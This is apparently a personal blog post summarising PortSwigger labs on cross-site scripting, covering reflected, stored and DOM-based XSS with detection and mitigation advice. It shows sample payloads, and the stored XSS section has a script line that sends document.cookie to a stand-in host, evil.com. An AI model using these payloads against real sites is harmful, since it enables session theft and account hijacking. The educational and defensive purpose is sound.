---
title: "Understanding Cross-Site Scripting (XSS) - OWASP Top 10 & PortSwigger Labs"
date: 2025-07-24
layout: post
tags: [owasp, xss, web-security, portswigger]
---

<div style="background-color: #f9f9f9; padding: 20px; border-left: 5px solid #f39c12; border-radius: 6px; margin-bottom: 20px;">

<strong>Table of Contents</strong>

<ul>
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#why-xss-matters">Why XSS Matters</a></li>
  <li><a href="#how-do-xss-attacks-work">How Do XSS Attacks Work?</a></li>
  <li><a href="#1-reflected-xss">1. Reflected XSS</a></li>
  <li><a href="#2-stored-xss">2. Stored XSS</a></li>
  <li><a href="#3-dom-based-xss">3. DOM-Based XSS</a></li>
  <li><a href="#summary">Summary</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
  <li><a href="#references">References</a></li>
</ul>

</div>

## Introduction

Cross-Site Scripting (XSS) is a critical vulnerability that allows attackers to inject malicious scripts into trusted websites, which are then executed in the browser of unsuspecting users. This blog summarizes my learnings from **PortSwigger Web Security Academy**, covering the main types of XSS, how they work, real-world payloads, and best practices to prevent them.

## Why XSS Matters

XSS attacks are dangerous because they exploit the trust between a user and a web application. Malicious JavaScript injected into the page can steal cookies, session tokens, or other sensitive data, perform actions on behalf of the user, and even propagate worms.

Modern apps using JavaScript-heavy frameworks (React, Angular, etc.) are still vulnerable if not configured properly. Exploits can affect both users and administrators, leading to session hijacking, phishing, and malware delivery.

## How Do XSS Attacks Work?

XSS occurs when a web application includes user-supplied input in its output to the browser without proper validation or escaping. This lets an attacker craft a malicious payload like:

```html
<script>alert('XSS')</script>

If the app reflects this script back in an HTTP response, it will be executed by the victim’s browser, giving control to the attacker.

## 1. Reflected XSS
Definition:
Reflected XSS happens when the malicious script is reflected immediately from the server in an error message, search result, or any other response that includes input sent by the client.

How It Works:
An attacker crafts a URL with a malicious payload, like:

php-template
--
https://victim.com/search?query=<script>alert('XSS')</script>
--
When a victim clicks it, the payload gets reflected and executed in their browser.

Example Payloads:
--
<script>alert(1)</script>
"><script>alert(1)</script>
--

Detection:

Input appears unescaped in the HTML response

Burp Suite's XSS Auditor

Browser dev tools to inspect injection points

Mitigation:

Sanitize and encode all input

Use HTML escaping libraries (e.g., OWASP Java Encoder)

Set proper Content-Type and CSP headers

Avoid writing raw user input into the DOM

<div style="text-align: center;"> <img src="/top10-owasp-blog/assets/images/xss-reflected.png" alt="Reflected XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;"> <p><em>Figure: Reflected XSS flow</em></p> </div>

## 2. Stored XSS
Definition:
Stored XSS, also called persistent XSS, is when the malicious payload is stored on the server (e.g., in a comment, profile bio, post) and served to users later.

How It Works:
An attacker submits a malicious script via a form field like this:
--
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
--
Anyone viewing that comment or post will have the script executed in their browser.

Impact:

Mass exploitation across users

Session theft

Admin account hijacking

Wormable attacks (self-propagating)

Detection:

Scan user-generated content for script tags

Monitor JavaScript events triggered by stored fields

Observe unexpected network calls in dev tools

Mitigation:

Escape all dynamic content before rendering

Use frameworks with auto-escaping (e.g., React)

Limit HTML input with allowlists

Sanitize inputs with libraries like DOMPurify

<div style="text-align: center;"> <img src="/top10-owasp-blog/assets/images/xss-stored.png" alt="Stored XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;"> <p><em>Figure: Stored XSS propagation</em></p> </div>

## 3. DOM-Based XSS
Definition:
DOM-based XSS occurs entirely on the client side when JavaScript in the page reads data from the DOM (e.g., location, document.referrer, innerHTML) and dynamically injects it into the page without validation.

How It Works:
Example vulnerable code:
--let q = location.hash.substring(1);
document.getElementById("result").innerHTML = q;
--
Payload:

php-template
--
https://example.com/#<img src=x onerror=alert(1)>
--
Detection:

Use DOM breakpoints in browser

Analyze dynamic DOM modifications

PortSwigger's DOM Invader (Burp Suite extension)

Mitigation:

Avoid writing raw HTML from untrusted sources

Use .textContent instead of .innerHTML

Sanitize DOM inputs

Avoid relying on location.href, document.referrer, etc.

<div style="text-align: center;"> <img src="/top10-owasp-blog/assets/images/xss-dom.png" alt="DOM XSS" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;"> <p><em>Figure: DOM-based XSS logic</em></p> </div>

### Conclusion
Understanding XSS via PortSwigger's interactive labs gave me a deeper insight into how script injection works across different attack surfaces. From URL-based injections to complex DOM-based flaws, each lab demonstrated the risks of unvalidated input and unsafe DOM manipulations. Developers must prioritize secure input/output handling and enforce CSP and encoding mechanisms to reduce exposure.

### References
PortSwigger XSS Labs

OWASP XSS Prevention Cheat Sheet

MDN Web Docs on XSS


